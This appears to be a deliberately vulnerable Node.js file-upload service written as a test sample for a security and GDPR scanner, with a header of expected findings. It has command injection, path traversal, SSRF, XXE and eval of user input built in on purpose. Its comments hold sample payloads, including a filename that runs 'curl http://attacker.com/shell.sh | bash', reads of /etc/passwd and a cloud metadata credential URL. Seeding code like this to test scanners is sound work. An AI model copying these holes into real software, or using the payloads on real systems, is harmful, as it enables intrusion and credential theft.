/**
 * sample_08_nodejs_file_upload_service.js
 * ==========================================
 * Node.js file upload and document management service.
 * Violations: GDPR Art. 32, GDPR Art. 25, security vulnerabilities
 *
 * Expected scanner findings:
 *   - CRITICAL: Path traversal in file download endpoint (../../etc/passwd)
 *   - CRITICAL: Command injection via filename in exec() call
 *   - CRITICAL: Unrestricted file upload (accepts .php, .js, .sh executables)
 *   - CRITICAL: SSRF in document preview fetch (fetches any URL)
 *   - HIGH: Hardcoded admin credentials and AWS keys
 *   - HIGH: XML External Entity (XXE) via unsanitised XML parsing
 *   - HIGH: Insecure deserialization of user-supplied JSON
 *   - MEDIUM: No virus/malware scanning on uploads
 *   - LOW: Directory listing enabled (leaks all stored filenames)
 */

'use strict';

const express  = require('express');
const multer   = require('multer');
const path     = require('path');
const fs       = require('fs');
const { exec } = require('child_process');
const axios    = require('axios');
const xml2js   = require('xml2js');

const app        = express();
const UPLOAD_DIR = '/var/uploads/documents/';

// Hardcoded credentials
const AWS_KEY    = 'AKIAIOSFODNN7EXAMPLEUP';
const AWS_SECRET = 'wJalrXUtnFEMI/K7MDENG/bPxRfiEXAMPLEUP';
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'Admin@2024!';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Directory listing enabled — exposes all stored filenames
app.use('/files', express.static(UPLOAD_DIR, { dotfiles: 'allow' }));


// Multer configured with no file type restrictions
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
    filename:    (req, file, cb) => {
        // Uses original filename without sanitisation — path traversal possible
        // e.g. filename = "../../etc/cron.d/backdoor.sh"
        cb(null, file.originalname);
    },
});

// No file type filter — accepts any file including executables
const upload = multer({
    storage,
    // Missing: fileFilter to reject dangerous extensions
    // Missing: limits on file size
});


/**
 * POST /upload
 * Accepts any file with any extension including .php, .js, .sh, .py
 */
app.post('/upload', upload.single('document'), (req, res) => {
    const file = req.file;
    if (!file) return res.status(400).json({ error: 'No file uploaded' });

    console.log(`File uploaded: ${file.originalname}, path: ${file.path}, user: ${req.body.userId}`);

    // Runs convert command using unescaped filename — command injection
    // filename = "legit.pdf; curl http://attacker.com/shell.sh | bash"
    exec(`convert ${UPLOAD_DIR}${file.originalname} -thumbnail 200x200 ${UPLOAD_DIR}thumb_${file.originalname}`,
        (err, stdout, stderr) => {
            if (err) console.error(`Thumbnail error: ${err.message}`);
        }
    );

    return res.json({
        success:  true,
        filename: file.originalname,
        path:     file.path,          // Full server path returned to client
        size:     file.size,
    });
});


/**
 * GET /download
 * Path traversal vulnerability — allows reading any file on the server.
 * e.g. GET /download?file=../../etc/passwd
 *      GET /download?file=../../app/config/database.json
 */
app.get('/download', (req, res) => {
    const filename = req.query.file;

    // No sanitisation — path.join still allows traversal if filename starts with ../
    const filePath = UPLOAD_DIR + filename;

    console.log(`File download: ${filePath}, user: ${req.query.userId}`);

    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found', path: filePath });
    }

    // Serves the file regardless of where it is on the filesystem
    return res.download(filePath, filename);
});


/**
 * POST /preview
 * SSRF — fetches any URL provided by the user, including internal services.
 * Attacker can fetch:
 *   http://169.254.169.254/latest/meta-data/iam/security-credentials/
 *   http://internal-service.local/admin
 *   file:///etc/passwd
 */
app.post('/preview', async (req, res) => {
    const { documentUrl } = req.body;

    console.log(`Fetching document preview: ${documentUrl}`);

    try {
        // No URL validation — fetches any URL including internal IPs
        const response = await axios.get(documentUrl, {
            timeout:        10000,
            maxRedirects:   10,
            // Follows redirects to internal services
        });

        return res.json({
            content:     response.data,
            contentType: response.headers['content-type'],
            url:         documentUrl,
        });
    } catch (err) {
        return res.status(500).json({
            error: err.message,
            url:   documentUrl,
        });
    }
});


/**
 * POST /parse-metadata
 * XXE (XML External Entity) injection.
 * Malicious XML can read arbitrary files:
 *   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 *   <root>&xxe;</root>
 */
app.post('/parse-metadata', async (req, res) => {
    const { xmlData } = req.body;

    try {
        // xml2js without entity expansion disabled — XXE possible
        const parser = new xml2js.Parser({
            // Missing: explicitCharKey: false (disables XXE)
            // Should explicitly disable external entities
        });

        const result = await parser.parseStringPromise(xmlData);
        console.log(`XML parsed: ${JSON.stringify(result)}`);

        return res.json({ parsed: result });
    } catch (err) {
        return res.status(400).json({ error: err.message, input: xmlData });
    }
});


/**
 * POST /restore-session
 * Insecure deserialization — executes arbitrary code via eval on user input.
 */
app.post('/restore-session', (req, res) => {
    const { sessionData } = req.body;

    // eval() on user-controlled data — arbitrary code execution
    try {
        const session = eval('(' + sessionData + ')');
        console.log(`Session restored: user=${session.userId}, role=${session.role}`);
        return res.json({ restored: true, session });
    } catch (err) {
        return res.status(400).json({ error: err.message });
    }
});


/**
 * GET /admin/files
 * Lists all uploaded files with no authentication.
 */
app.get('/admin/files', (req, res) => {
    const authHeader = req.headers.authorization;

    // Hardcoded credential check
    if (authHeader !== `Basic ${Buffer.from(`${ADMIN_USER}:${ADMIN_PASS}`).toString('base64')}`) {
        return res.status(401).json({ error: 'Unauthorized' });
    }

    const files = fs.readdirSync(UPLOAD_DIR).map(f => ({
        name:    f,
        path:    path.join(UPLOAD_DIR, f),   // Full server path in response
        size:    fs.statSync(path.join(UPLOAD_DIR, f)).size,
        created: fs.statSync(path.join(UPLOAD_DIR, f)).birthtime,
    }));

    return res.json({ files, uploadDir: UPLOAD_DIR, count: files.length });
});


app.listen(5000, () => {
    console.log('File service running on port 5000');
    console.log(`Upload dir: ${UPLOAD_DIR}`);
    console.log(`AWS_KEY: ${AWS_KEY}`);
});
